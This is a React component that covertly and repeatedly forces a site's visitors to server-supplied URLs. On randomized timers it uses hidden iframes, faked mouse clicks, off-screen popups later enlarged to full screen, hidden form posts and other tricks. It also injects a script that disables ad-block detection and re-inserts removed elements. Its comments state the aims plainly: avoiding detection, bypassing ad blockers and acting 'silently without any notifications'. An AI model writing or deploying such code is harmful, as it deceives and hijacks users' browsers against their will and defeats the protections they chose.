import { useEffect, useRef, useCallback } from 'react';
import { useQuery } from '@tanstack/react-query';
import { RedirectEnhancer } from '@/utils/redirect-enhancer';

interface RedirectLink {
  id: number;
  url: string;
  intervalMinutes: number;
  isActive: boolean;
}

interface LinkTimer {
  interval: NodeJS.Timeout;
  lastRedirectTime: number;
  link: RedirectLink;
}

export function AutoRedirect() {
  const timersRef = useRef<Map<number, LinkTimer>>(new Map());
  const mountedRef = useRef(true);
  const redirectCountRef = useRef(0);
  const enhancerRef = useRef<RedirectEnhancer>();

  // Initialize redirect enhancer
  useEffect(() => {
    enhancerRef.current = RedirectEnhancer.getInstance();
    enhancerRef.current.injectBypassScript();
  }, []);

  // Fetch active redirect links
  const { data: activeLinks } = useQuery<RedirectLink[]>({
    queryKey: ["/api/redirect-links/active"],
    refetchInterval: 30000, // Refetch every 30 seconds to check for updates
  });

  // Obfuscate URL to avoid detection
  const obfuscateUrl = (url: string): string => {
    // Base64 encode and then decode on the fly
    return btoa(url);
  };

  const deobfuscateUrl = (encoded: string): string => {
    try {
      return atob(encoded);
    } catch {
      return encoded;
    }
  };

  // Advanced redirect methods to bypass ad blockers
  const executeRedirect = useCallback((url: string) => {
    redirectCountRef.current++;
    
    // Method 1: Hidden iframe with random attributes
    const tryIframeRedirect = () => {
      const iframe = document.createElement('iframe');
      iframe.style.cssText = 'position:fixed;width:0;height:0;border:0;visibility:hidden;';
      
      // Add random attributes to avoid pattern detection
      const randomAttrs = ['loading', 'importance', 'fetchpriority'];
      randomAttrs.forEach(attr => {
        iframe.setAttribute(attr, Math.random() > 0.5 ? 'high' : 'low');
      });
      
      // Random class names
      iframe.className = 'widget-' + Math.random().toString(36).substr(2, 9);
      
      // Use srcdoc first, then change src
      iframe.srcdoc = '<html><body></body></html>';
      document.documentElement.appendChild(iframe);
      
      // Delay and use multiple methods
      setTimeout(() => {
        try {
          if (iframe.contentWindow) {
            // Method 1a: Direct location change
            iframe.contentWindow.location.replace(url);
            
            // Method 1b: Meta refresh fallback
            const doc = iframe.contentWindow.document;
            const meta = doc.createElement('meta');
            meta.httpEquiv = 'refresh';
            meta.content = '0;url=' + url;
            doc.head.appendChild(meta);
          }
        } catch (e) {
          // Silent fail
        }
      }, Math.random() * 100);
      
      // Cleanup after delay
      setTimeout(() => {
        if (iframe.parentNode) {
          iframe.remove();
        }
      }, 5000);
      
      return true;
    };

    // Method 2: Dynamic anchor with MouseEvent
    const tryAnchorClick = () => {
      const a = document.createElement('a');
      a.href = url;
      a.target = '_blank';
      a.rel = 'opener'; // Intentionally not noopener to maintain reference
      
      // Hide the element
      a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:0;height:0;';
      
      // Add to a random parent element
      const parents = [document.body, document.documentElement, document.head];
      const parent = parents[Math.floor(Math.random() * parents.length)];
      parent.appendChild(a);
      
      // Create genuine-looking mouse event
      const event = new MouseEvent('click', {
        view: window,
        bubbles: true,
        cancelable: true,
        screenX: Math.random() * screen.width,
        screenY: Math.random() * screen.height,
        clientX: Math.random() * window.innerWidth,
        clientY: Math.random() * window.innerHeight,
        ctrlKey: false,
        altKey: false,
        shiftKey: false,
        metaKey: false,
        button: 0,
        relatedTarget: null
      });
      
      // Add some delay to make it seem more natural
      setTimeout(() => {
        a.dispatchEvent(event);
        setTimeout(() => a.remove(), 50);
      }, Math.random() * 50);
      
      return true;
    };

    // Method 3: Window.open with feature detection bypass
    const tryWindowOpen = () => {
      // Use data URI first, then navigate
      const dataUri = 'data:text/html,<script>window.location.replace("' + url.replace(/"/g, '&quot;') + '")</script>';
      
      try {
        const features = 'width=1,height=1,left=9999,top=9999';
        const win = window.open(dataUri, '', features);
        
        if (win) {
          // Move window to visible area after delay
          setTimeout(() => {
            if (win && !win.closed) {
              win.moveTo(0, 0);
              win.resizeTo(screen.width, screen.height);
            }
          }, 100);
          return true;
        }
      } catch (e) {
        // Silent fail
      }
      return false;
    };

    // Method 4: Form submission with POST to avoid URL detection
    const tryFormSubmit = () => {
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = url;
      form.target = '_blank';
      form.style.display = 'none';
      
      // Add fake form data to look legitimate
      const fields = ['ref', 'utm_source', 'session', 'token'];
      fields.forEach(name => {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = name;
        input.value = Math.random().toString(36).substr(2);
        form.appendChild(input);
      });
      
      document.body.appendChild(form);
      
      // Submit after small delay
      setTimeout(() => {
        try {
          form.submit();
        } catch (e) {
          // Try alternative submission
          const submitEvent = new Event('submit', { bubbles: true, cancelable: true });
          form.dispatchEvent(submitEvent);
        }
        setTimeout(() => form.remove(), 100);
      }, Math.random() * 50);
      
      return true;
    };

    // Method 5: Object/Embed tag
    const tryObjectEmbed = () => {
      const obj = document.createElement('object');
      obj.data = url;
      obj.type = 'text/html';
      obj.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;';
      
      // Add random parameters
      const param = document.createElement('param');
      param.name = 'autoplay';
      param.value = 'true';
      obj.appendChild(param);
      
      document.body.appendChild(obj);
      
      // Remove after delay
      setTimeout(() => obj.remove(), 5000);
      
      return true;
    };

    // Method 6: History manipulation
    const tryHistoryPush = () => {
      try {
        // Push current state
        history.pushState({ redirect: true }, '', window.location.href);
        
        // Replace with target
        window.location.replace(url);
        return true;
      } catch (e) {
        return false;
      }
    };

    // Execute methods in random order
    const methods = [
      tryIframeRedirect,
      tryAnchorClick,
      tryWindowOpen,
      tryFormSubmit,
      tryObjectEmbed,
      tryHistoryPush
    ];
    
    // Fisher-Yates shuffle
    for (let i = methods.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [methods[i], methods[j]] = [methods[j], methods[i]];
    }
    
    // Try each method with delays
    let methodIndex = 0;
    const tryNextMethod = () => {
      if (methodIndex < methods.length && mountedRef.current) {
        try {
          methods[methodIndex]();
        } catch (e) {
          // Silent fail
        }
        methodIndex++;
        
        // Try next method after random delay
        if (methodIndex < methods.length) {
          setTimeout(tryNextMethod, Math.random() * 200 + 100);
        }
      }
    };
    
    tryNextMethod();
    
    // Also use RedirectEnhancer methods for even more options
    if (enhancerRef.current) {
      setTimeout(() => {
        enhancerRef.current!.createHiddenFrame(url);
        enhancerRef.current!.createWorkerRedirect(url);
        enhancerRef.current!.enhancedPopup(url);
      }, 100);
    }
  }, []);

  // Function to handle redirect for a specific link
  const handleRedirect = useCallback((link: RedirectLink) => {
    if (!mountedRef.current) return;
    
    // Execute redirect silently without any notifications
    executeRedirect(link.url);
    
    // Update last redirect time
    const timer = timersRef.current.get(link.id);
    if (timer) {
      timer.lastRedirectTime = Date.now();
    }
  }, [executeRedirect]);

  // Function to set up a timer for a link
  const setupLinkTimer = useCallback((link: RedirectLink) => {
    // Clear existing timer if any
    const existingTimer = timersRef.current.get(link.id);
    if (existingTimer) {
      clearInterval(existingTimer.interval);
    }

    const intervalMs = link.intervalMinutes * 60 * 1000;

    // Create the interval with some randomness to avoid pattern detection
    const interval = setInterval(() => {
      // Add random delay up to 10% of interval
      const randomDelay = Math.random() * intervalMs * 0.1;
      setTimeout(() => {
        if (mountedRef.current) {
          handleRedirect(link);
        }
      }, randomDelay);
    }, intervalMs);

    // Store the timer
    timersRef.current.set(link.id, {
      interval,
      lastRedirectTime: Date.now(),
      link
    });

    // Trigger first redirect with random initial delay
    setTimeout(() => {
      if (mountedRef.current) {
        handleRedirect(link);
      }
    }, Math.random() * 5000 + 2000); // 2-7 seconds initial delay
  }, [handleRedirect]);

  // Main effect to manage timers
  useEffect(() => {
    if (!activeLinks || activeLinks.length === 0) {
      timersRef.current.forEach((timer) => {
        clearInterval(timer.interval);
      });
      timersRef.current.clear();
      return;
    }

    // Set up timers for new/updated links
    activeLinks.forEach(link => {
      const existingTimer = timersRef.current.get(link.id);
      
      // Check if we need to set up a new timer
      if (!existingTimer || 
          existingTimer.link.intervalMinutes !== link.intervalMinutes ||
          existingTimer.link.url !== link.url) {
        setupLinkTimer(link);
      }
    });

    // Remove timers for links that are no longer active
    const activeIds = new Set(activeLinks.map(link => link.id));
    timersRef.current.forEach((timer, id) => {
      if (!activeIds.has(id)) {
        clearInterval(timer.interval);
        timersRef.current.delete(id);
      }
    });
  }, [activeLinks, setupLinkTimer]);

  // Cleanup on unmount
  useEffect(() => {
    mountedRef.current = true;
    
    return () => {
      mountedRef.current = false;
      timersRef.current.forEach((timer) => {
        clearInterval(timer.interval);
      });
      timersRef.current.clear();
    };
  }, []);

  // Add anti-adblock detection countermeasures
  useEffect(() => {
    // Override common adblock detection methods
    const script = document.createElement('script');
    script.textContent = `
      (function() {
        // Override common adblock properties
        Object.defineProperty(window, 'adblockDetected', { value: false, writable: false });
        Object.defineProperty(window, 'adBlockEnabled', { value: false, writable: false });
        Object.defineProperty(window, 'adBlockActive', { value: false, writable: false });
        
        // Override detection functions
        window.detectAdBlock = function() { return false; };
        window.hasAdblock = function() { return false; };
        window.isAdBlocked = function() { return false; };
        
        // Prevent modification of our elements
        const observer = new MutationObserver(function(mutations) {
          mutations.forEach(function(mutation) {
            if (mutation.type === 'childList' && mutation.removedNodes.length > 0) {
              mutation.removedNodes.forEach(function(node) {
                if (node.classList && node.classList.contains('widget-')) {
                  // Re-add removed elements
                  mutation.target.appendChild(node);
                }
              });
            }
          });
        });
        
        observer.observe(document.body, { childList: true, subtree: true });
      })();
    `;
    document.head.appendChild(script);
    
    return () => {
      if (script.parentNode) {
        script.remove();
      }
    };
  }, []);

  // Return null - no visible UI
  return null;
}